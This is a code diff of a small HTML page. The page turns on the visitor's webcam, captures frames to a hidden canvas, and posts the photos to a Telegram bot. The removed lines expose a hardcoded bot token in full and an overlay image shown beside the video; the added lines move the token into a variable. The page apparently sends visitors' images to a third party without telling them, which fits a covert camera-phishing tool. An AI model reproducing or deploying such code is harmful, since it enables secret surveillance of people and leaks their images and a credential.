@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -26,13 +27,9 @@
 </head>
 <body>
   <div>
-    <video id="video" style="position: absolute; top: 40%; left: 50%; transform: translate(-50%, -10%); z-index: 10;" autoplay playsinline width="320" height="240"></video>
-    <canvas id="canvas" width="320" height="240" style="display: none;"></canvas>
-    <div>
-        <img src="Untitled15_20241012133933.png" width="600" height="950" alt="Overlay Image" />
-    </div>
-</div>
-
+    <video id="video" autoplay playsinline width="320" height="240"></video>
+    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+  </div>
 
   <script>
     const video = document.getElementById('video');
@@ -65,7 +62,7 @@
       formData.append('photo', blob, 'photo.png');
 
       // Send the photo to Telegram
-      fetch(`https://api.telegram.org/bot7640540352:AAGF09r5VkmVLAUJezWKvsWuz4r96ykeUa8/sendPhoto`, {
+      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
         method: 'POST',
         body: formData
       })
